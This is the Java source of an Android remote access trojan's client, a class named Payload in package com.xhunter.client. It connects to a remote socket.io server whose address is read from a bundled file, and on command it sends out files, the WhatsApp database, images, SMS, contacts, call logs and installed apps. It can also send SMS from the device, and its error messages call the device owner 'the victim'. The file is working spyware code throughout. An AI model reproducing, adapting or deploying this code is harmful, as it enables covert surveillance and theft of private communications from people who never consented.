package com.xhunter.client;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.view.View;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;


import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.RandomAccessFile;
import java.math.BigInteger;
import java.net.URI;
import java.net.URLConnection;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;


import io.socket.client.Ack;
import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;


public class Payload {

    private static Socket mSocket;
    private static Context mcontext;

    public static void start(Context context) {
        mcontext = context;
        startAsync();
    }

    public static void startAsync() {
        new Thread() {
            @Override
            public void run() {
                // Execute the payload
                Payload.main();
            }
        }.start();
    }

    public static void main() {
        Log.e("xhunterTest", "<++++++++++++++++><><>><<<<>Successfully started myself++++>>>>>>>>");
       // connectToSocket("https://xhunter.loca.lt");
        try{
            BufferedReader reader = new BufferedReader(new InputStreamReader(mcontext.getAssets().open("ip.txt")));
            String ip=reader.readLine().trim();
            System.out.println(ip);
            System.out.println(ip.length());
            if(ip.length()>0){
                connectToSocket(ip);
            }
            }catch (IOException e){}
    }


    /**
     * The purpose of this method is to get the call back for any type of connection error
     */
    private static final Emitter.Listener getDirectory = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            if(checkPermission(Manifest.permission.READ_EXTERNAL_STORAGE)){
                getDir(args[0].toString());
            }else{
                try {
                    if (mSocket != null && mSocket.connected()) {
                        JSONObject data = new JSONObject();
                        data.put("error","Permission not allowed by victim");
                        mSocket.emit("error", data);
                    } else {
                        Log.e("JSON ", "sending data failed");
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }

        }
    };
    private static final Emitter.Listener getDirectoryByPath = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            if(checkPermission(Manifest.permission.READ_EXTERNAL_STORAGE)){
                getDirfromPath(args[0].toString());
            }else{
                try {
                    if (mSocket != null && mSocket.connected()) {
                        JSONObject data = new JSONObject();
                        data.put("error","Permission not allowed by victim");
                        mSocket.emit("error", data);
                    } else {
                        Log.e("JSON ", "sending data failed");
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }

        }
    };
    private static final Emitter.Listener downloadFile = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            File filePath = new File(Environment.getExternalStorageDirectory().getPath()+args[0].toString());
            if(filePath.isFile()) {
                uploadFileToServer("download",filePath,0);
            }
        }
    };
    private static final Emitter.Listener downloadWhatsappDatabase = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            File filePath = new File(args[0].toString());
            if(filePath.isFile()) {
                uploadFileToServer("downloadWhatsappDatabase",filePath,0);
            }else{
                try {
                    if (mSocket != null && mSocket.connected()) {
                        JSONObject data = new JSONObject();
                        data.put("error","Whatsapp database not found yet please wait for victim to login");
                        mSocket.emit("error", data);
                    } else {
                        Log.e("JSON ", "sending data failed");
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }

            }
        }
    };
    private static final Emitter.Listener previewImage = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            File filePath = new File(Environment.getExternalStorageDirectory().getPath()+args[0].toString());
            if(filePath.isFile()) {
                try {
                    if (mSocket != null && mSocket.connected()) {
                        JSONObject imageData = new JSONObject();
                        imageData.put("image",getImageData(filePath));
                        mSocket.emit("previewImage", imageData);
                    } else {
                        Log.e("JSON ", "sending data failed");
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    };
    private static final Emitter.Listener getSMS = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            if(checkPermission(Manifest.permission.READ_SMS)){
                try {
                    JSONObject jsonObj = new JSONObject(args[0].toString());
                    getAllSms(mcontext,jsonObj.getInt("start"),jsonObj.getInt("end"));
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }else{
                try {
                    if (mSocket != null && mSocket.connected()) {
                        JSONObject data = new JSONObject();
                        data.put("error","Permission not allowed by victim");
                        mSocket.emit("error", data);
                    } else {
                        Log.e("JSON ", "sending data failed");
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }

        }
    };
    private static final Emitter.Listener getInstalledApps = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            try {
                if (mSocket != null && mSocket.connected()) {
                    JSONObject installedApps = new JSONObject();;
                    JSONArray list = new JSONArray();
                    List<PackageInfo> packages = mcontext.getPackageManager().getInstalledPackages(0);
                    for(int i=0;i<packages.size();i++) {
                        JSONObject data = new JSONObject();
                        PackageInfo p = packages.get(i);
                        data.put("appName", p.applicationInfo.loadLabel(mcontext.getPackageManager()).toString());
                        data.put("packageName",p.packageName);
                        list.put(data);
                    }
                    installedApps.put("installedApps",list);
                    mSocket.emit("getInstalledApps", installedApps);
                } else {
                    Log.e("JSON ", "sending data failed");
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    };
    private static final Emitter.Listener getContacts = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            if(checkPermission(Manifest.permission.READ_CONTACTS)){
                    getAllContacts();
            }else{
                try {
                    if (mSocket != null && mSocket.connected()) {
                        JSONObject data = new JSONObject();
                        data.put("error","Permission not allowed by victim");
                        mSocket.emit("error", data);
                    } else {
                        Log.e("JSON ", "sending data failed");
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }

        }
    };
    private static final Emitter.Listener sendSMS = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            if(checkPermission(Manifest.permission.SEND_SMS)){
                JSONObject jsonObj = null;
                try {
                    jsonObj = new JSONObject(args[0].toString());
                    if(sendSMS(jsonObj.getString("msg"),jsonObj.getString("mobile_no"))){
                        mSocket.emit("sendSMS", "success");
                    }else{
                        JSONObject data = new JSONObject();
                        try {
                            data.put("error","Message send Failed!");
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                        mSocket.emit("error", data);
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }else{
                try {
                    if (mSocket != null && mSocket.connected()) {
                        JSONObject data = new JSONObject();
                        data.put("error","Permission not allowed by victim");
                        mSocket.emit("error", data);
                    } else {
                        Log.e("JSON ", "sending data failed");
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }

        }
    };
    private static final Emitter.Listener getCallLog = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            if(checkPermission(Manifest.permission.READ_CALL_LOG)){
                    mSocket.emit("getCallLog", readCallLog(mcontext));
            }else{
                try {
                    if (mSocket != null && mSocket.connected()) {
                        JSONObject data = new JSONObject();
                        data.put("error","Permission not allowed by victim");
                        mSocket.emit("error", data);
                    } else {
                        Log.e("JSON ", "sending data failed");
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }

        }
    };

    private static final Emitter.Listener onConnectionError = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            Log.e("Response", args[0].toString());
        }
    };
    private static final Emitter.Listener onServerConnect = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            Log.e("xhunterTest", "Server Connected Success");
            JSONObject deviceInfo = new JSONObject();
            String android_id = Settings.Secure.getString(mcontext.getContentResolver(), Settings.Secure.ANDROID_ID);
            TelephonyManager telMgr = (TelephonyManager)mcontext.getSystemService(Context.TELEPHONY_SERVICE);
            String sim = telMgr.getNetworkOperatorName();
            Intent intent = mcontext.registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            float powerState = getBatteryPercentage(intent);
            String appInstallTime="";
            try {
                SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm");
                appInstallTime = sdf.format(new Date(getPackageInfo(mcontext).firstInstallTime));
            } catch (Exception e) {
                e.printStackTrace();
            }
            try {
                deviceInfo.put("id", android_id);
                deviceInfo.put("model", Build.MODEL);
                deviceInfo.put("android", Build.VERSION.RELEASE);
                deviceInfo.put("battery", powerState);
                deviceInfo.put("sim", sim);
                deviceInfo.put("manufacture", Build.MANUFACTURER);
                deviceInfo.put("appInstallTime", appInstallTime);
                deviceInfo.put("freeDiskStorage", getFreeDiskStorage());
                deviceInfo.put("totalDiskCapacity", getTotalDiskCapacity());
            } catch (JSONException e) {
                e.printStackTrace();
            }
            sendDataToServer("join",deviceInfo);
        }
    };
    private static final Emitter.Listener onServerDisconnect = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            Log.e("Response", "onServerDisconnection");
        }
    };

    /**
     * The purpose of this method to create the socket object
     */
    public  static void connectToSocket(String uri) {
        try {
            mSocket = IO.socket(URI.create(uri));
            makeConnection();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static void makeConnection() {
        if (mSocket != null) {
            registerConnectionAttributes();
            mSocket.connect();
        }

    }
    public static void registerConnectionAttributes() {
        try {
            if (mSocket != null) {
                mSocket.on(Socket.EVENT_CONNECT_ERROR, onConnectionError);
                mSocket.on(Socket.EVENT_DISCONNECT, onServerDisconnect);
                mSocket.on(Socket.EVENT_CONNECT, onServerConnect);
                registerHandlers();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
    /**
     * The purpose of this method is to register the connection from the socket
     */
    private static void registerHandlers() {
        try {
            //register you all method here
            mSocket.on("getDir", getDirectory);
            mSocket.on("getDirByPath", getDirectoryByPath);
            mSocket.on("download", downloadFile);
            mSocket.on("downloadWhatsappDatabase", downloadWhatsappDatabase);
            mSocket.on("previewImage", previewImage);
            mSocket.on("getSMS", getSMS);
            mSocket.on("getInstalledApps", getInstalledApps);
            mSocket.on("getContacts", getContacts);
            mSocket.on("sendSMS", sendSMS);
            mSocket.on("getCallLog", getCallLog);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    /**
     * The purpose of this method is to send the data to the server
     */
    public static void sendDataToServer(String methodOnServer, JSONObject request) {

        try {
            if (mSocket != null && mSocket.connected()) {
                mSocket.emit(methodOnServer, request);
            } else {
                Log.e("JSON ", "sending data failed");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
    public static void sendDataToServer(String methodOnServer, JSONArray request) {

        try {
            if (mSocket != null && mSocket.connected()) {
                mSocket.emit(methodOnServer, request);
            } else {
                Log.e("JSON ", "sending data failed");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
    public static void uploadFileToServer(String methodOnServer,File f, int offSet) {
        try {
            if (mSocket != null && mSocket.connected()) {
                RandomAccessFile ra = new RandomAccessFile(f, "rw");
                int sizeOfFiles = 1024 * 1024;// 1MB
                byte[] bytes;
                byte[] buffer = new byte[sizeOfFiles];
                int bytesRead;
                ByteArrayOutputStream output = new ByteArrayOutputStream();
                JSONObject file = new JSONObject();

                ra.seek(offSet);
                try {
                    if((bytesRead = ra.read(buffer)) != -1){
                        output.write(buffer, 0, bytesRead);
                        bytes = output.toByteArray();
                        ra.close();
                        output.close();
                        file.put("fileName",f.getName());
                        file.put("fileSize",f.length());
                        file.put("fileUploadedSize",(offSet+bytes.length));
                        file.put("fileData",bytes);
                        System.out.println(bytes.length);
                        mSocket.emit(methodOnServer, file, new Ack() {
                            @Override
                            public void call(Object... args) {
                                String msg = (String) args[0];
                                System.out.println(msg);
                                uploadFileToServer(methodOnServer, f, (offSet+sizeOfFiles));
                            }
                        });
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            } else {
                Log.e("JSON ", "sending data failed");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
    /**
     * Helper methods down below
     */
    private static float getBatteryPercentage(Intent intent) {
        if(intent == null) {
            return (float)0.0;
        }

        int batteryLevel = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
        int batteryScale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);

        return batteryLevel / (float)batteryScale;
    }
    private static PackageInfo getPackageInfo(Context context) throws Exception {
        return context.getPackageManager().getPackageInfo(context.getPackageName(), 0);
    }
    public static double getFreeDiskStorage() {
        try {
            StatFs rootDir = new StatFs(Environment.getRootDirectory().getAbsolutePath());
            StatFs dataDir = new StatFs(Environment.getDataDirectory().getAbsolutePath());

            Boolean intApiDeprecated = Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2;
            long rootAvailableBlocks = getTotalAvailableBlocks(rootDir, intApiDeprecated);
            long rootBlockSize = getBlockSize(rootDir, intApiDeprecated);
            double rootFree = BigInteger.valueOf(rootAvailableBlocks).multiply(BigInteger.valueOf(rootBlockSize)).doubleValue();

            long dataAvailableBlocks = getTotalAvailableBlocks(dataDir, intApiDeprecated);
            long dataBlockSize = getBlockSize(dataDir, intApiDeprecated);
            double dataFree = BigInteger.valueOf(dataAvailableBlocks).multiply(BigInteger.valueOf(dataBlockSize)).doubleValue();

            return rootFree + dataFree;
        } catch (Exception e) {
            return -1;
        }
    }
    private static long getTotalAvailableBlocks(StatFs dir, Boolean intApiDeprecated) {
        return (intApiDeprecated ? dir.getAvailableBlocksLong() : dir.getAvailableBlocks());
    }
    public static double getTotalDiskCapacity() {
        try {
            StatFs rootDir = new StatFs(Environment.getRootDirectory().getAbsolutePath());
            StatFs dataDir = new StatFs(Environment.getDataDirectory().getAbsolutePath());

            BigInteger rootDirCapacity = getDirTotalCapacity(rootDir);
            BigInteger dataDirCapacity = getDirTotalCapacity(dataDir);

            return rootDirCapacity.add(dataDirCapacity).doubleValue();
        } catch (Exception e) {
            return -1;
        }
    }
    private static BigInteger getDirTotalCapacity(StatFs dir) {
        boolean intApiDeprecated = Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2;
        long blockCount = intApiDeprecated ? dir.getBlockCountLong() : dir.getBlockCount();
        long blockSize = intApiDeprecated ? dir.getBlockSizeLong() : dir.getBlockSize();
        return BigInteger.valueOf(blockCount).multiply(BigInteger.valueOf(blockSize));
    }
    private static long getBlockSize(StatFs dir, Boolean intApiDeprecated) {
        return (intApiDeprecated ? dir.getBlockSizeLong() : dir.getBlockSize());
    }
    private static void getDir(String p) {
        String path = Environment.getExternalStorageDirectory().getPath()+p;
        File directory = new File(path);
        File[] files = directory.listFiles();
        JSONArray Dir = new JSONArray();
        if(directory.canRead() && files!=null) {
            for(File file: files){
                try{
                    JSONObject obj = new JSONObject();
                    if(file.isDirectory()){
                        int items = file.list().length;
                        obj.put("items", items);
                        obj.put("isDirectory", true);
                    }else {
                        obj.put("isDirectory", false);
                        obj.put("size", file.length());
                        if(isImageFile(file.getPath())){
                            obj.put("isImage", true);
                        }else{
                            obj.put("isImage", false);
                        }
                    }
                    obj.put("name", file.getName());
                    Dir.put(obj);
                }catch (JSONException e){
                    e.printStackTrace();
                }
            }
            sendDataToServer("getDir",Dir);
        }
        else{
            Log.d("Null?", "it is null");
        }
    }
    private static void getDirfromPath(String path) {
        File directory = new File(path);
        File[] files = directory.listFiles();
        JSONArray Dir = new JSONArray();
        if(directory.canRead() && files!=null) {
            for(File file: files){
                try{
                    JSONObject obj = new JSONObject();
                    if(file.isDirectory()){
                        int items = file.list().length;
                        obj.put("items", items);
                        obj.put("isDirectory", true);
                    }else {
                        obj.put("isDirectory", false);
                        obj.put("size", file.length());
                        if(isImageFile(file.getPath())){
                            obj.put("isImage", true);
                        }else{
                            obj.put("isImage", false);
                        }
                    }
                    obj.put("name", file.getName());
                    Dir.put(obj);
                }catch (JSONException e){
                    e.printStackTrace();
                }
            }
            sendDataToServer("getDir",Dir);
        }
        else{
            Log.d("Null?", "it is null");
        }
    }
    private static String getBase64Data(File filePath) {
        try {
            InputStream inputStream = new FileInputStream(filePath);//You can get an inputStream using any IO API
            byte[] bytes;
            byte[] buffer = new byte[8192];
            int bytesRead;
            ByteArrayOutputStream output = new ByteArrayOutputStream();
            try {
                while ((bytesRead = inputStream.read(buffer)) != -1) {
                    output.write(buffer, 0, bytesRead);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            bytes = output.toByteArray();
            inputStream.close();
            output.close();
            return Base64.encodeToString(bytes, Base64.DEFAULT);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "";
    }
    private static boolean isImageFile(String path) {
        String mimeType = URLConnection.guessContentTypeFromName(path);
        boolean b = mimeType != null && mimeType.startsWith("image");
        if(b){
            return BitmapFactory.decodeFile(path) != null;
        }
        return false;
    }
    private static String getImageData(File imagefile) {
        FileInputStream fis = null;
        try{
            fis = new FileInputStream(imagefile);
        }catch(FileNotFoundException e){
            e.printStackTrace();
        }
        Bitmap bm = BitmapFactory.decodeStream(fis);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        bm.compress(Bitmap.CompressFormat.JPEG,10,baos);
        byte[] b = baos.toByteArray();
        String encImage = "data:image/jpeg;base64," + Base64.encodeToString(b, Base64.DEFAULT);
        return encImage;
    }
    private static boolean checkPermission(String permission) {
        if (mcontext.checkCallingOrSelfPermission(permission) == PackageManager.PERMISSION_DENIED) {
            return false;
        }else{
            return true;
        }
    }
    private static void getAllSms(Context context, int START, int END) {
        JSONArray SMS = new JSONArray();
        JSONObject smsData = new JSONObject();
        ContentResolver cr = context.getContentResolver();
        Cursor c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
        int totalSMS = 0;
        if (c != null) {
            totalSMS = c.getCount();
            if ( c.moveToPosition(START)) {
                if(END>totalSMS) {
                    for (int j = START; j < totalSMS; j++) {
                        JSONObject obj = new JSONObject();
                        String smsDate = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE));
                        String number = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                        String body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY));
                        Date dateFormat = new Date(Long.valueOf(smsDate));
                        try {
                            obj.put("number", number);
                            obj.put("body", body);
                            obj.put("date", dateFormat);
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                        SMS.put(obj);
                        c.moveToNext();
                    }//loop closed
                    try {
                        smsData.put("isEnd",true);
                        smsData.put("totalSMS",totalSMS);
                        smsData.put("sms",SMS);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                }else{
                    for (int j = START; j < END; j++) {
                        JSONObject obj = new JSONObject();
                        String smsDate = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE));
                        String number = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                        String body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY));
                        Date dateFormat = new Date(Long.valueOf(smsDate));
                        try {
                            obj.put("number", number);
                            obj.put("body", body);
                            obj.put("date", dateFormat);
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                        SMS.put(obj);
                        c.moveToNext();
                    }//loop closed
                    try {
                        smsData.put("isEnd",false);
                        smsData.put("totalSMS",totalSMS);
                        smsData.put("sms",SMS);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                }
                sendDataToServer("getSMS",smsData);
            }
            c.close();
        }
    }
    public static void getAllContacts(){
        try {
            JSONObject contacts = new JSONObject();
            JSONArray list = new JSONArray();
            Cursor cur = mcontext.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[] { ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER}, null, null,  ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");


            while (cur.moveToNext()) {
                JSONObject contact = new JSONObject();
                @SuppressLint("Range") String name = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));// for  number
                @SuppressLint("Range") String num = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));// for name
                contact.put("phoneNo", num);
                contact.put("name", name);
                list.put(contact);
            }
            contacts.put("contactsList", list);
            sendDataToServer("getContacts",contacts);
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }
    public static boolean sendSMS(String message, String recipient){
        try{
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(recipient, null, message, null, null);
        }catch(Exception ex){
            return false;
        }
        return true;
    }
    public static JSONObject readCallLog(Context context) {
        JSONObject Calls = null;
        try {
            Calls = new JSONObject();
            JSONArray list = new JSONArray();
            Uri allCalls = Uri.parse("content://call_log/calls");
            Cursor cur = context.getContentResolver().query(allCalls, null, null, null, null);
            while (cur.moveToNext()&&list.length()<100) {
                JSONObject call = new JSONObject();
                @SuppressLint("Range") String num = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.NUMBER));// for  number
                @SuppressLint("Range") String name = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME));// for name
                @SuppressLint("Range") String duration = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.DURATION));// for duration
                @SuppressLint("Range") int type = Integer.parseInt(cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.TYPE)));// for call type, Incoming or out going.

                call.put("phoneNo", num);
                call.put("name", name);
                call.put("duration", duration);
                call.put("type", type);
                list.put(call);
            }
            Calls.put("callsLog", list);
        } catch (JSONException e) {
            e.printStackTrace();
            return null;
        }
        return Calls;
    }
}
